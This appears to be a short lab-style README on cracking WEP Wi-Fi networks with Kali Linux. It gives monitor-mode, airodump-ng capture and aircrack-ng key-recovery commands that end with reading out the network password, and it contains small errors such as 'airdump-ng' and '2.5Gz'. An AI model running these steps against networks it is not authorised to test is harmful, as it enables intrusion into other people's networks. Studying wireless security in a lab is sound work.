# Network Hacking (wifi)

## Objective
Network Hacking and gaining access to Wifi networks and cracking them.

### Skills Learned

- Sniffing on 5Gz and 2.5Gz wireless networks
- aircrack-ng
  

### Tools Used

- Kali Linux.
- VMware Fusion.
- airodump-ng
- aircrack-ng

## Steps for WAP

- Changing the wireless USB mode to monitoring
```bash
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

The mode will be Monitor now

- Sniffing on 5G and 2.4G networks and find the network with the cipher WEP
```bash
airdump-ng --band abg wlan0
```

- Sniffing packets from the network with the WEP cipher with the specific MAC and channel number and save the results in a file test
```bash
airodump-ng --bssid 03:DE:4B:AD:CC:8B --channel 9 --write test mon0
```

- Wait for the #Data number to move real fast and open a new terminal window and ls to find the ".cap" file that you created.
- Use aircrack-ng to find the Key from the file we created ending with .cap
```bash
aircrack-ng test.cap
```
- Copy the key and remove the : and that would be the wifi password.
